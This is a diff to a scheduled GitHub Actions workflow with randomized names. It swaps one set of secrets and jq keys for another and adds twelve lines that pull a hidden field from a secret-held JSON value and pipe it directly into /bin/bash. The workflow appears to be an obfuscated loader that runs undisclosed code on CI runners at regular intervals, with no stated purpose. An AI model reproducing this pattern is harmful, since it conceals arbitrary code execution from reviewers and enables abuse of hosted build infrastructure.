@@ -1,11 +1,10 @@
 name: caifeihua0917
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 2/6 * * *'
+    - cron: '2 4/6 * * *'
 
-jobs:  # 30292
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,12 +12,18 @@ jobs:  # 30292
       - uses: actions/checkout@v4
       - name: caifeihua0917
         env:
-          l95414: ${{ secrets.l95414 }}
+          hwfw67168: ${{ secrets.hwfw67168 }}
         run: |
-          echo $l95414 | jq -r .fpx74973 | /bin/bash
-          echo $xbcbq24 | jq -r .ftsoy825 | /bin/bash
-          echo $yebw377 | jq -r .r07895 | /bin/bash
-          echo $jqo363 | jq -r .ebvgp26 | /bin/bash
-          echo $bvwve9996 | jq -r .lkue93 | /bin/bash
-          echo $bsvso8 | jq -r .qxyke46 | /bin/bash
+          echo $hwfw67168 | jq -r .qc2059 | /bin/bash
+          echo $p652 | jq -r .k4 | /bin/bash
+          echo $zp0 | jq -r .mk081 | /bin/bash
+          echo $dku10 | jq -r .oxfn175 | /bin/bash
+          echo $zox08956 | jq -r .am7 | /bin/bash
+          echo $voa19351 | jq -r .wfv85 | /bin/bash
+          echo $kfgv895 | jq -r .k7649 | /bin/bash
+          echo $zcdj098 | jq -r .zugo3 | /bin/bash
+          echo $wsck622 | jq -r .m1 | /bin/bash
+          echo $pif22 | jq -r .lr9 | /bin/bash
+          echo $xlmbk01449 | jq -r .mbt74 | /bin/bash
+          echo $xz351 | jq -r .luksr114 | /bin/bash
 
